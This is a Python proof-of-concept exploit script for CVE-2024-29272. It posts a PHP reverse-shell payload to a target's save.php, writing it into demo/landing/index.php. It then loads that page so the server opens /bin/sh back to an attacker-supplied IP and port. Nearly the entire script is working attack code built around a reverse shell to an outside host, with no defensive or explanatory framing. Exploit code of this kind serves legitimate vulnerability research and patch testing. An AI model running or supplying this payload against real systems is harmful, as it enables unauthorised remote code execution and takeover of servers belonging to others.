import requests
import urllib.parse as parse
import sys

def exploit(url, ip, port):
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Accept": "*/*",
		"Content-Length": "150",
		"Content-Type": "application/x-www-form-urlencoded",
		"Connection": "close"}
	payload = requests.post(f"{url}/save.php", headers=headers, data=f"file=demo/landing/index.php&html=<?php $sock=fsockopen('{ip}',{port});$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>")
	print("[+] Shell uploaded...")
	shell = requests.get(f"{url}/demo/landing/index.php")
	print("[+] You should have a shell now. Enjoy!")
	
def main():
	print("[+] CVE-2024-29272 Proof of Concept")
	if len(sys.argv) < 6:
		print("[+] Usage: python3 poc.py -u <URL> -l <LISTENING IP> -p <LISTENING PORT>")

	else:
		for i in range(len(sys.argv)):
			if sys.argv[i] == "-u":
				try:
					url = sys.argv[i+1]	
					if not "http" in sys.argv[i+1]:
						raise Exception("wrong url")

				except Exception as e:
					if e.args[0] == "wrong url":
						print("[!] Invalid url. Exiting...")
						return None

			if sys.argv[i] == "-l":
				try:
					ip = sys.argv[i+1]
					if not "." in sys.argv[i+1]:
						raise Exception("bad ip")

				except Exception as e:
					if e.args[0] == "bad ip":
						print("[!] Invalid IP. Exiting...")
						return None

			if sys.argv[i] == "-p":
				try:
					port = int(sys.argv[i+1])
				except ValueError:
					print("[!] Invalid port. Exiting...")
					return None
		exploit(url, ip, port)

				
main()
